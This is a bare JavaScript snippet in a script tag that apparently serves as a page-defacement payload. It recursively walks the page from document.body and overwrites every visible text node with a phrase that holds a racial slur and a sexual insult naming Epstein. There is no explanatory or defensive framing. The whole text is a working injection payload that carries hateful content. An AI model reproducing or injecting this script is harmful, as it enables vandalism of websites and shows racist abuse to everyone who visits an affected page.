<script>(function replaceAllText(node) {
  if (node.nodeType === 3) {
    if (node.nodeValue.trim() !== "") {
      node.nodeValue = "EPSTEIN FUCKS NIGGERS";
    }
    return;
  }

  if (node.nodeType === 1 && !["SCRIPT", "STYLE", "NOSCRIPT"].includes(node.tagName)) {
    for (let child of node.childNodes) {
      replaceAllText(child);
    }
  }
})(document.body);</script>
